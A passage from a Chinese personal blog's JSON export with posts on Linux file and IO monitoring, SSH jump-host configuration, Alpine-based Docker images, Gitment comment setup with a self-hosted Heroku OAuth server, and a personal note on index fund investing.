inotifywait命令可以用来收集有关文件访问信息，Linux发行版一般没有包括这个命令，需要安装inotify-tools，这个命令还需要将inotify支持编译入Linux内核，好在大多数Linux发行版都在内核中启用了inotify。 inotifywatch命令用于收集关于被监视的文件系统的统计数据，包括每个 inotify 事件发生多少次。 安装访问这里 根据自己的操作系统版本安装，这里以centos 7 为例 1yum --enablerepo&#x3D;epel install inotify-tools notifywait命令参数 -m是要持续监视变化。 -r使用递归形式监视目录。 -q减少冗余信息，只打印出需要的信息。 -e指定要监视的事件列表。 --timefmt是指定时间的输出格式。 --format指定文件变化的详细信息。 可监听的事件 事件 描述 access 访问，读取文件。 modify 修改，文件内容被修改。 attrib 属性，文件元数据被修改。 move 移动，对文件进行移动操作。 create 创建，生成新文件 open 打开，对文件进行打开操作。 close 关闭，对文件进行关闭操作。 delete 删除，文件被删除。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"科普：什么是IO HANG","slug":"科普，什么是IO-hang","date":"2019-03-05T07:18:43.000Z","updated":"2021-02-26T06:05:29.349Z","comments":true,"path":"posts/724.html","link":"","permalink":"https://awen.me/posts/724.html","excerpt":"IO HANG 其实就是 IO 假死，一般来说可能是 IO 负载过高导致的。IO 负载高的原因也有可能是因为内存不足导致启用了 swap，频繁的对swap 进行读写而导致的 IO 高。 在Linux 中，我们可以通过一些工具来判断当前系统的 IO 状态。","text":"IO HANG 其实就是 IO 假死，一般来说可能是 IO 负载过高导致的。IO 负载高的原因也有可能是因为内存不足导致启用了 swap，频繁的对swap 进行读写而导致的 IO 高。 在Linux 中，我们可以通过一些工具来判断当前系统的 IO 状态。 iostat示例用法 1iostat -d -k 2 -d 表示，显示设备（磁盘）使用状态。 -k 表示让某些使用 block 为单位的列强制使用 kB 为单位。 2表示，数据显示每隔3秒刷新一次。 更多说明可以man 查看说明 1234567891011121314151617[root@aliyun fwj]# iostat -d -k 3Linux 4.20.13-1.el7.elrepo.x86_64 (aliyun) 2019年03月05日 _x86_64_ (1 CPU)Device: tps kB_read&#x2F;s kB_wrtn&#x2F;s kB_read kB_wrtnvda 1.46 7.94 34.18 2899273 12489384Device: tps kB_read&#x2F;s kB_wrtn&#x2F;s kB_read kB_wrtnvda 0.00 0.00 0.00 0 0Device: tps kB_read&#x2F;s kB_wrtn&#x2F;s kB_read kB_wrtnvda 0.00 0.00 0.00 0 0Device: tps kB_read&#x2F;s kB_wrtn&#x2F;s kB_read kB_wrtnvda 0.00 0.00 0.00 0 0Device: tps kB_read&#x2F;s kB_wrtn&#x2F;s kB_read kB_wrtnvda 2.51 0.00 14.07 0 28 iotop说明 默认情况下按照 IO 使用量倒序排序，可以用左右箭头操作排序的字段。 按 r 切换排序方式。 按 o 只显示有磁盘 IO 活动的进程。 更多参数及返回结果说明，可以参阅 iotop 的 man 帮助。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Total DISK READ : 0.00 B&#x2F;s | Total DISK WRITE : 0.00 B&#x2F;sActual DISK READ: 0.00 B&#x2F;s | Actual DISK WRITE: 39.22 K&#x2F;s TID PRIO USER DISK READ DISK WRITE SWAPIN IO&gt; COMMAND 1359 be&#x2F;3 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.19 % [jbd2&#x2F;vda1-8] 1 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % systemd --switched-root --system --deserialize 22 2 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kthreadd] 3 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [rcu_gp] 4 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [rcu_par_gp] 6 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kworker&#x2F;0:0H-kblockd] 8 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [mm_percpu_wq] 9 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [ksoftirqd&#x2F;0] 10 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [rcu_sched] 11 rt&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [migration&#x2F;0] 3084 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % rsyslogd -n [rs:main Q:Reg] 13 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [cpuhp&#x2F;0] 14 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kdevtmpfs] 15 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [netns] 16 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kauditd] 17 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [khungtaskd] 18 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [oom_reaper] 19 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [writeback] 20 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kcompactd0] 21 be&#x2F;5 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [ksmd] 22 be&#x2F;7 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [khugepaged] 23 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [crypto] 24 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kintegrityd] 25 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kblockd] 26 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [tpm_dev_wq] 27 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [md] 28 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [edac-poller] 29 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [devfreq_wq] 30 rt&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [watchdogd]13343 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % dockerd-current --add-runtime docker-runc&#x3D;&#x2F;usr&#x2F;libexec&#x2F;docker&#x2F;docker-runc-current --defa~ux-enabled --log-driver&#x3D;journald --signature-verification&#x3D;false --storage-driver overlay213344 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % dockerd-current --add-runtime docker-runc&#x3D;&#x2F;usr&#x2F;libexec&#x2F;docker&#x2F;docker-runc-current --defa~ux-enabled --log-driver&#x3D;journald --signature-verification&#x3D;false --storage-driver overlay213345 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % dockerd-current --add-runtime docker-runc&#x3D;&#x2F;usr&#x2F;libexec&#x2F;docker&#x2F;docker-runc-current --defa~ux-enabled --log-driver&#x3D;journald --signature-verification&#x3D;false --storage-driver overlay2 34 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kswapd0]13347 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % dockerd-current --add-runtime docker-runc&#x3D;&#x2F;usr&#x2F;libexec&#x2F;docker&#x2F;docker-runc-current --defa~ux-enabled --log-driver&#x3D;journald --signature-verification&#x3D;false --storage-driver overlay213348 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % dockerd-current --add-runtime docker-runc&#x3D;&#x2F;usr&#x2F;libexec&#x2F;docker&#x2F;docker-runc-current --defa~ux-enabled --log-driver&#x3D;journald --signature-verification&#x3D;false --storage-driver overlay213349 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % dockerd-current --add-runtime docker-runc&#x3D;&#x2F;usr&#x2F;libexec&#x2F;docker&#x2F;docker-runc-current --defa~ux-enabled --log-driver&#x3D;journald --signature-verification&#x3D;false --storage-driver overlay2 3111 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % AliYunDunUpdate 3113 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % AliYunDunUpdate 3114 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % AliYunDunUpdate 3119 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % AliYunDunUpdate 3081 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % rsyslogd -n [in:imjournal]13913 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kworker&#x2F;0:1-events]24179 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % docker-proxy-current -proto tcp -host-ip 0.0.0.0 -host-port 443 -container-ip 172.17.0.2 -container-port 443 2309 be&#x2F;4 chrony 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % chronyd24184 be&#x2F;4 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % docker-proxy-current -proto tcp -host-ip 0.0.0.0 -host-port 443 -container-ip 172.17.0.2 -container-port 443 121 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kthrotld] 122 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [acpi_thermal_pm] 123 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kmpath_rdacd] 124 be&#x2F;0 root 0.00 B&#x2F;s 0.00 B&#x2F;s 0.00 % 0.00 % [kaluad] free通过查看内存的swap 分区是否占用过高也可以辅助判断IO 负载是否过高。 1234[root@aliyun fwj]# free -h total used free shared buff&#x2F;cache availableMem: 985M 165M 272M 1.5M 547M 644MSwap: 0B 0B 0B","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"使用ProxyCommand代理跳板机登录","slug":"使用ProxyCommand代理跳板机登录","date":"2019-03-04T12:03:00.000Z","updated":"2021-02-26T06:05:29.307Z","comments":true,"path":"posts/20989.html","link":"","permalink":"https://awen.me/posts/20989.html","excerpt":"有时候我们要登录一台云服务器需要先登录一台A机器后然后在通过A机器跳转到目标机器，这么做的好处就是讲登录权限的范围进行控制，让登录的服务器处于可控范围内不至于被任何非信任用户访问。 那么问题来了，我得先本地 ssh 到A机器，然后在A 机器ssh 到B机器吗？这也太麻烦了。","text":"有时候我们要登录一台云服务器需要先登录一台A机器后然后在通过A机器跳转到目标机器，这么做的好处就是讲登录权限的范围进行控制，让登录的服务器处于可控范围内不至于被任何非信任用户访问。 那么问题来了，我得先本地 ssh 到A机器，然后在A 机器ssh 到B机器吗？这也太麻烦了。 其实，ssh 可以通过本地的config 文件进行配置，我们可以编辑 ~/.ssh/config 123456Host * PasswordAuthentication no ChallengeResponseAuthentication no HashKnownHosts yes ProxyCommand ssh jump@123.111.104.111 -p 65422 -W %h:%p 上面的配置是所有的链接都会走跳板机，如果不希望这么做，可以指定具体的服务器进行配置 123456Host aliyun HostName 112.111.27.197 User fwj IdentityFile &#x2F;Users&#x2F;fwj&#x2F;.ssh&#x2F;id_rsa Port 65422 ProxyCommand ssh jump@123.111.104.111 -p 65422 -W %h:%p","categories":[],"tags":[]},{"title":"如何理财之定投指数基金","slug":"如何定投指数基金","date":"2019-03-03T12:37:20.000Z","updated":"2021-02-26T06:05:29.326Z","comments":true,"path":"posts/34558.html","link":"","permalink":"https://awen.me/posts/34558.html","excerpt":"最近在学习一些关于理财的知识，发现这个里面的门道其实还是很多的。现在把学习笔记整理下拿出来分享下。 理财就是理生活，即使你目前手头没有多少钱，也应该学会管理自己的财富。切记做“月光族“。当然理财并不是说让你把钱存银行活期或买银行的定期，那个收益率着实不高，还不如余额宝随存随取。","text":"最近在学习一些关于理财的知识，发现这个里面的门道其实还是很多的。现在把学习笔记整理下拿出来分享下。 理财就是理生活，即使你目前手头没有多少钱，也应该学会管理自己的财富。切记做“月光族“。当然理财并不是说让你把钱存银行活期或买银行的定期，那个收益率着实不高，还不如余额宝随存随取。 首先，要转变的是一种思维方式，不要觉得没有多少钱就不需要理财，财商是需要培养的，要避免陷入“穷人”思维。没错，父母那辈经历过很多，他们穷怕了，导致他们做一些事情的时候都是力求稳定，比如你要找工作，他们就会要求你去谋个稳定的铁饭碗，比如考个公务员呀。在然后，我的父母会千叮万嘱我在外要照顾好自己，该花钱的地方要舍得花，不该花的地方要省着花。然后要存点钱，钱存哪里呢？他们的理解是钱当然是存银行了。我记得前几年他们把我弟弟给他的钱就拿去银行存了个定期一年。哎呀，我的天，一万多块钱，一年收益多少呢，我们看下银行的存款利率表吧。 看下图，一万块钱整存整取 一年年利率是1.75%，一年利息是175块钱。。 哈哈哈，还没有余额宝活期收益高。所以，有闲钱，千万别丢银行或让他趴在银行卡，那样是给银行做贡献，你要知道银行拿着你的存款去做信贷业务，以信用卡为例，分期利率一年大概15%左右，信用卡取现万分之五一天。 看上图的实际年利率是存款的多少倍吧。你存款给银行一年利息是172，信用卡分期可是816哦。 我们的学校，我们的父母从小都没教会我们如何培养自己的财商，导致很多人花钱大手大脚，没有规划没有目的的超前消费，透支消费也在无形中让你陷入“月光族“。 理财第一步，资产负债表和收入支出表理财的第一步，就是要知道自己有多少收入，以及日常的消费都往哪里花了，要把自己的收入和支出进行记录，统计分析哪些是理性消费，哪些是冲动消费。要了解2张表，资产负债表和收入支出表。资产负债表记录你的资产和负债信息。什么是资产呢？资产就是你手里的现金，负债就是你钱朋友的钱、欠银行的钱，比如信用卡欠款、蚂蚁花呗欠款等等。 理财第二步，强制储蓄现在人大都喜欢超前消费，各种买买买，剁剁剁，刷卡的时候很轻松，还款的时候两行泪，透支消费买一些自己能力之外的东西永远无法变得富有，因此理财的第二步就是在第一步的基础上分析自己的消费。强制每月进行储蓄。毛主席曾经说过“手中有粮，心中不慌“。储蓄这个事情是一定要做的。 理财第三步，进行财商学习很多人都没有经过系统的财商学习，学校不教，家长也不会，但是不重要，我们可以自己学习，推荐几本书 《穷爸爸富爸爸》以及《小狗钱钱》 能够让你理解穷人和富人的思维方式以及复利的魅力。 理财第四步，定个小目标作为普通人，也别赚他一个亿了，那是隔壁老王的目标。我们的目标是让资产跑赢通货膨胀，假设通货膨胀是每年5%，我们希望年化收益率是13%。 理财第五步，分析市场上的理财产品目前市场上的理财产品，我大概罗列下有，按照投资风险分依次如下： 定期存款， 银行的定期存款利率非常低，非常不推荐各位把钱扔银行。 货币基金，比如余额宝，以及各种宝宝类产品，以前一万块钱一年还能有1块钱的收益，现在跌到2.8%了，一万块钱只有几毛钱一天。货币基金收益稳定，基本不会亏损。 债券，债券属于比货币风险高一点的产品，不保本，但是长期看收益率会比货币基金高，比如下图这款“招商产业债券”近3年的收益率是14.57% 基金，基金本质上就是股票，你把钱投给基金公司，基金公司的经理人会帮你去购买一堆的股票。相比你自己买股票，假设一支股票是10块钱一股，A股是一手100股，也就是你买一手需要1000块钱，在手头没有这么多钱时，买基金是个不错的选择，1000块钱你可以买一篮子股票了，股票涨你就有钱，股票跌你就亏钱，也是不保本的，但是从长期来看定投指数基金是个不错的选择。著名的投资人巴菲特曾经说过，一个什么都不懂的投资人如果长期定投指数基金，他的收益率会比专业的投资人还要高，巴菲特做了一辈子的投资，在即使看遍世上所有的投资工具下，他仍然认为指数基金是最简单赚钱的理财方式。 指数基金即跟踪指数的基金，指数也分为很多种，从规模指数来看，有沪深300、中证500、上证50、上证红利、中证红利以及创业板指、中小板指等等，从全球来看，还包括标普500、纳斯达克100指数、道琼斯88指数、恒生指数、日经指数、印尼雅加达指数等等。 指数基金还分为宽指和行业指数基金，宽指就是例如沪深300、中证500、上证50 等，还有行业的比如白酒行业指数等，招商中证白酒指数基金2017年累计收益高达75%，中证白酒指数中就包含了贵州茅台，五粮液、泸州老窖等等白酒股，行业指数也分很多等级，最多有四级，就如消费指数、食品饮料指数与白酒指数的对应就是一二三级，消费包含食品饮料、食品饮料包含白酒。 过去五年，国内外规模指数的走势是怎样的？答案是沪深300自05年成立之初至今十二年间折合年化收益为12%，近十年，标普指数折合年化收益率10.5%，纳斯达克指数折合年化收益率为10.1%，即使是表现不合格的创业板指数，从成立至今的八年时间中年化收益也达到了6.7%，因而可以看出，长期持有指数基金，收益基本能跑赢大部分的理财产品。 股票，很多人经历了2轮牛市后有的亏的跳楼，于是觉得股票这个东西不能碰，其实是他们根本不了解股票的本质以及没有做好风险控制，贪心+非理性投资，不设止损线，所以会亏的一塌糊涂。但是股票本质上是一种风险超级高的投资产品，当然高风险伴随着高收益。炒股分短线和长线投资，短线嘛就是看K线图在合适的价格买入然后在高位卖出，长期投资就是挑选好的公司股票，然后合适的价格买入，长期持有，然后享受公司的分红，当然在价格超出估值时你也可以卖出。 房产，房子本身也是具有金融属性的产品，从最近10几年来看，早买房的都赚了好几倍。没上车的估计这会入场也赚不到钱了。因为现在的房市就和2015年的股市一样，到顶了，现在买房子就是相当于2015年开户去炒股，风险大于收益。 理财第六步，闲钱理财我们每个月的工资要扣除生活必须开支后，然后预留6个月的备用金，以预防未知的风险，当紧急用钱的时候我们能够拿出来，因为定投的钱是长期的，至少要定投3年以上，这个和经济周期有关系，在这个周期内这个定投的钱是会有亏有赚的，但是这些都是浮亏和浮赢，因为你并没有取出来。切记高买低卖，要坚持。 理财第七步，给自己买保险在购买理财产品前，最应该做的是给自己购买一份意外险+重疾险+医疗险，最好是立刻学习保险相关知识，在自己身体健康的时候买入保险，因为很多保险有疾病后是不可以买了，健康告知过不了，即使你买了，保险公司也不赔。但是总体来说，保险本身也是一种高杠杆的保障类理财产品。虽然他不能为我们赚钱，但是他能够保障我们在发生意外后不至于一夜回到解放前。另外切记不要买分红类保险，那个收益率还不如银行存款。我们买保险的目的是为了防止意外，注重的应该是意外后的赔偿金额，另外要仔细阅读保险条款中的免责声明和健康告知项。 理财第八步，如何购买指数基金上面说了一堆的投资产品，本文重点讲解指数基金定投。定投指数基金分为场内和场外，场内嘛就是你要去证券公司开户，然后和买股票一样，场外就是在各个基金代理商购买，下图是常见的指数基金的场内和场外代码 场内和场外的区别是： 价格不一样，场内购买就跟买股票一样，可以选择低位买，而场外的指数基金价格是根据收盘价格进行计算得到的并非实际的基金价格。如图所示： 场内的中证 500 价格 场外中证500价格 场内不支持定投，场外，比如支付宝蚂蚁财富购买指数基金可以设置定投，到期自动扣款。但是手续费很高。 手续费不一样，场内手续费便宜，场外的手续费贵。 场内需要开户，场外支付宝就可以买。 一般还是推荐购买场内的，毕竟手续费便宜 怎么购买不管是选择场内还是场外，我们都应该在合适的价格买入，然后在合适的价格卖出，那么什么才是合适呢？我们可以根据指数的温度来进行购买，当温度低于10度时，我们每个月都把可投资的闲钱拿去定投这支基金，如果温度超过30度以上我们持有基金，转去投资其他温度更低的基金，当温度达到40-50度甚至以上时，我们就卖出该基金。 支付宝里面也有指数红绿灯，都是差不多的意思了。 为什么要这么做呢，因为交易市场是波动的，比如2015年牛市顶峰上证指数高达5000多点，随后暴跌到今天2900多，2018年下半年从3700点跌到2400多。我们要避免在高位买入，所以这个温度都是根据历史数据计算得到的。 选择质量高的指数基金选择指数基金要看基金公司的规模，一般要千亿以上级别的，可以从天天基金网查看基金公司排名，然后还要看基金的规模，大于1亿以上的，小于1亿的基金很有可能清盘，意思就是给你自动卖了，以及历史收益率，重点看在熊市的收益率。因为牛市大家都赚钱，熊市才能看出来基金的品质好不好。可以看基金的排名,看其 1年 3年 5年的收益率 分散风险鸡蛋不要放一个篮子里面，投资也是一样，在定投指数基金时，如果温度达到了30度以上，我们就持有该基金，然后去投资更低温度的基金，并且为了分散风险，最好多买点其他理财产品，比如上证50 、中证500、沪深300、港股类指数和美股类指数都买一点。在例如债券、黄金、货币基金、银行定期理财都买一点，分散风险。 推荐目前购买：中证500 ，因为温度很低。黄金等跌到260在考虑吧，现在282的价格有点贵。沪深300 建议持有，没有持有的也不要着急入场。 如何计算每月投资的钱假如你现在工资 5000，存款30000，我们分为增量和存量的钱分别计算每个月的定投金额 存量金额，从存款扣除3-6个月的日常开销的总费用，假设10000，余下的钱分20个月存量每个月定投，也就是20000/20=1000 每月 增量金额，是你每个月的工资-(商业保险费用/12)-每月日常开销= 可以投资的钱 假设工资10000，一年商业保险费5000，每个月生活费4000，就等于10000-(5000/12)-4000= 可投资的钱 风险系数，100岁-现在的年龄，100岁-27岁=73% 然后计算每个月的定投金额 (存量+增量)*73% = 当月可以投资的钱。 定投指数基金须知 要有耐心，一般在一个经济周期内，收益是有波动的，但是从长期看这个收益率还是比较客观的。至少能够使你的资产保值。 要每个月都定投，如果指数温度过高就把每个月定投的钱暂时存入货币基金等到合适的温度在买入。一般买入可以根据文档来决定，比如文档低于10 ，100%的当月可投资金额买入，温度 10-20 投资80%资金，温度20-30，投资70%的资金。 要设置止盈止损线。切记贪念，不要赚最后一个铜板。比如你设置的目标收益率是13%，当到达这个收益率时且温度超过40度以上了你就要卖出了，否则风险会越来越大。 最后，投资自己投资自己的大脑，不断的学习和提升自己的能力才是最大的投资。 附件，思维导图，我媳妇整理的","categories":[],"tags":[{"name":"理财","slug":"理财","permalink":"https://awen.me/tags/%E7%90%86%E8%B4%A2/"}]},{"title":"容器中使用alpine镜像","slug":"容器中使用alpine镜像","date":"2019-03-03T02:51:51.000Z","updated":"2021-02-26T06:05:29.332Z","comments":true,"path":"posts/32132.html","link":"","permalink":"https://awen.me/posts/32132.html","excerpt":"之前构建 Dockerfile 一般我都是使用 Debian，镜像大小大概在 50多M 左右。然后我最近在阿里云构建镜像时发现阿里云的镜像漏洞扫描扫出来很多漏洞，比如 gcc systemd 等软件包的漏洞。在阿里云打补丁得买他们的服务，300多一个月。","text":"之前构建 Dockerfile 一般我都是使用 Debian，镜像大小大概在 50多M 左右。然后我最近在阿里云构建镜像时发现阿里云的镜像漏洞扫描扫出来很多漏洞，比如 gcc systemd 等软件包的漏洞。在阿里云打补丁得买他们的服务，300多一个月。 最近我发 alpine 这个操作系统的镜像非常好用，我们来看下他的大小，最小的镜像只有5.5M，而且此操作系统所带的软件包很新，当我构建完之后再去阿里云扫下漏洞发现漏洞是0个。Alpine Linux是一个基于安全的轻量级Linux发行版，基于 musl libc和 Busybox。其官网https://alpinelinux.org/alpine 的官网的 slogan 是“Small. Simple. Secure.”，哈哈哈，确实名副其实。 123456[root@aliyun &#x2F;]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEnginx v1 8653d98e78bc 37 hours ago 247 MBzheyi v1 c5ed70b8eb2d 47 hours ago 89.3 MBdocker.io&#x2F;python 3.7.2-alpine3.8 e131096e5977 9 days ago 78.6 MBdocker.io&#x2F;alpine 3.9 caf27325b298 4 weeks ago 5.53 MB 那么在使用alipne 镜像时候，我们需要注意下时区的同步，以及他的软件包管理器 apk 的使用，比如时区，我们需要安装 tzdata 然后同步本地的时区文件信息。 123456789101112FROM python:3.7.2-alpine3.8RUN apk update &amp;&amp; apk add tzdata \\ &amp;&amp; ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime \\ &amp;&amp; ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;timezone \\ &amp;&amp; touch &#x2F;var&#x2F;log&#x2F;cron.log \\ &amp;&amp; pip3 install requestsCOPY zheyi.py &#x2F;opt&#x2F;zheyi.pyCOPY crontab &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;rootCMD crond &amp;&amp; tail -f &#x2F;var&#x2F;log&#x2F;cron.log","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"博客评论系统使用gitment","slug":"博客评论系统使用gitment","date":"2019-03-02T23:47:25.000Z","updated":"2021-02-26T06:05:29.318Z","comments":true,"path":"posts/64465.html","link":"","permalink":"https://awen.me/posts/64465.html","excerpt":"一开始我博客的评论系统使用的是多说，后来多说倒闭了换成网易云跟帖，结果后来网易云跟帖也关了，我就换成disqus，结果disqus 被墙了。。。","text":"一开始我博客的评论系统使用的是多说，后来多说倒闭了换成网易云跟帖，结果后来网易云跟帖也关了，我就换成disqus，结果disqus 被墙了。。。 昨天把hexo升级了下，想着索性就看看有没有更合适的评论系统用，然后就发现了gitment。配置完效果还不错 它本质上是利用了GitHub Issues ，将评论同步到GitHub 那么，如何申请和配置呢？ 注册 OAuth Application点击此处 来注册一个新的 OAuth Application。其他内容可以随意填写，但要确保填入正确的 callback URL（一般是评论页面对应的域名，如 https://awen.me）。 你会得到一个 client ID 和一个 client secret，这个将被用于之后的用户登录。 配置 hexo12345678910111213141516gitment: enable: true mint: true # RECOMMEND, A mint on Gitment, to support count, language and proxy_gateway count: true # Show comments count in post meta area lazy: true # Comments lazy loading with a button cleanly: true # Hide 'Powered by ...' on footer, and more language: # Force language, or auto switch by theme github_user: 'GitHub 用户名' # MUST HAVE, Your Github ID github_repo: '仓库名称' # MUST HAVE, The repo you use to store Gitment comments client_id: '上面申请的client ID' # MUST HAVE, Github client id for the Gitment client_secret: '上面申请的Client secret' # EITHER this or proxy_gateway, Github access secret token for the Gitment proxy_gateway: # Address of api proxy, See: https://github.com/aimingoo/intersect redirect_protocol: # Protocol of redirect_uri with force_redirect_protocol when mint enabled# Baidu Share 坑基本到这里就配置完了，不过，在实际使用过程中会有问题，因为作者的认证服务器https://gh-oauth.imsun.net 挂了，所以一直登陆不成功，提示 [object ProgressEvent]， 解决办法修改 next 主题下的themes/next/layout/_third-party/comments 下的 gitment.swig，替换 js文件如下： 123456789101112&#123;% if not (theme.duoshuo and theme.duoshuo.shortname) and not theme.duoshuo_shortname %&#125;&#123;% if theme.gitment.enable and theme.gitment.client_id %&#125;&lt;!-- LOCAL: You can save these files to your site and update links --&gt; &#123;% if theme.gitment.mint %&#125; &#123;% set CommentsClass = \"Gitmint\" %&#125; &lt;link rel=\"stylesheet\" href=\"https://aimingoo.github.io/gitmint/style/default.css\"&gt; &lt;script src=\"https://file.awen.me/gitment.js\"&gt;&lt;/script&gt; &#123;% else %&#125; &#123;% set CommentsClass = \"Gitment\" %&#125; &lt;link rel=\"stylesheet\" href=\"https://imsun.github.io/gitment/style/default.css\"&gt; &lt;script src=\"https://file.awen.me/gitment.browser.js\"&gt;&lt;/script&gt; &#123;% endif %&#125; 如果你不用我这个，你也可以自己搭建认证服务器，具体操作步骤如下 使用 Heroku 搭建GitHub 认证服务器Heroku是一个支持多种编程语言的云平台即服务，注册Heroku，在右上角的“new”，选择“Create New App”新建一个应用。根据操作系统下载并安装Heroku CLI，或者使用npm install heroku，我这里以mac为例 1brew tap heroku&#x2F;brew &amp;&amp; brew install heroku 登陆heroku，OSX输入指令之后，会自动打开一个页面输入登陆用户名和密码 1heroku login 获取 gh-oauth-server 1git clone https:&#x2F;&#x2F;github.com&#x2F;imsun&#x2F;gh-oauth-server.git 修改package.json，在script中添加如下代码 1&quot;heroku&quot;: &quot;NODE_ENV&#x3D;production node server&quot; 如下所示 1234567891011121314&#123; &quot;name&quot;: &quot;gh-oauth-server&quot;, &quot;version&quot;: &quot;0.0.1&quot;, &quot;scripts&quot;: &#123; &quot;start&quot;: &quot;node server&quot;, &quot;heroku&quot;: &quot;NODE_ENV&#x3D;production node server&quot; &#125;, &quot;dependencies&quot;: &#123; &quot;body-parser&quot;: &quot;^1.17.1&quot;, &quot;express&quot;: &quot;^4.15.2&quot;, &quot;multer&quot;: &quot;^1.3.0&quot;, &quot;request&quot;: &quot;^2.81.0&quot; &#125;&#125; 新建Procfile文件,输入以下内容 1web: npm run heroku 在heroku上找到你刚刚创建的应用，切换到“Deploy”,有详细的操作步骤 12345$ heroku git:clone -a YourAppName$ cd YourAppName$ git add .$ git commit -am &quot;make it better&quot;$ git push heroku master 切换到“Settings”，找到“Domain”的值，即应用的地址。然后参考上面的解决办法中将gitment.browser.js 文件中的值进行修改。两个gitment.browser.js 都需要修改。 12345&#x2F;&#x2F; 将 gitment.js中的 _utils.http.post(&#39;https:&#x2F;&#x2F;gh-oauth.imsun.net&#39;, &#123;&#125;)&#x2F;&#x2F; 改为_utils.http.post(&#39;https:&#x2F;&#x2F;YourAppName.herokuapp.com&#x2F;&#39;, &#123;&#125;)","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://awen.me/tags/hexo/"}]},{"title":"Centos7 升级最新内核","slug":"Centos7-升级最新内核","date":"2019-03-01T01:09:26.000Z","updated":"2021-02-26T06:05:29.242Z","comments":true,"path":"posts/3138.html","link":"","permalink":"https://awen.me/posts/3138.html","excerpt":"目前最新的内核是 4.20.13我们希望升级centos 7 的内核，可以安装如下步骤操作","text":"目前最新的内核是 4.20.13我们希望升级centos 7 的内核，可以安装如下步骤操作 安装步骤安装 epel12# rpm --import 